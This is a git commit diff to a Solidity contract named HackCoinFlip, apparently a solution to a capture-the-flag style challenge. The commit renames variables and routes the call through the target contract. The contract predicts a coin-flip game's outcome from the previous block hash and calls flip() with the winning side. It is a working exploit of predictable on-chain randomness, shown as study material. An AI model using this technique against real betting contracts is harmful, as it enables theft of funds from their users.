b2345e7396239d19bb90e0f23dc1764dc889c7ef
John Matthews <JMMatthews@Protonmail.com>
2022-01-20 23:27:52 -0600

    Rename variables to describe function

--- contracts/HackCoinFlip.sol
+++ contracts/HackCoinFlip.sol
@@ -8,16 +8,16 @@ interface ICoinFlip {
 contract HackCoinFlip {
     bool public side;
     uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    ICoinFlip coinFlip;
+    ICoinFlip coinFlipContract;
 
-    constructor(address _coinFlip) public {
-      coinFlip = CoinFlip(_coinFlip);
+    constructor(address _coinFlipContract) public {
+      coinFlipContract = CoinFlip(_coinFlipContract);
     }
 
     function hack() public {
         uint256 blockValue = uint256(blockhash(block.number.sub(1)));
         uint256 coinFlip = blockValue.div(FACTOR);
         side = coinFlip == 1 ? true : false;
-        flip(side);
+        coinFlipContract.flip(side);
     }
 }
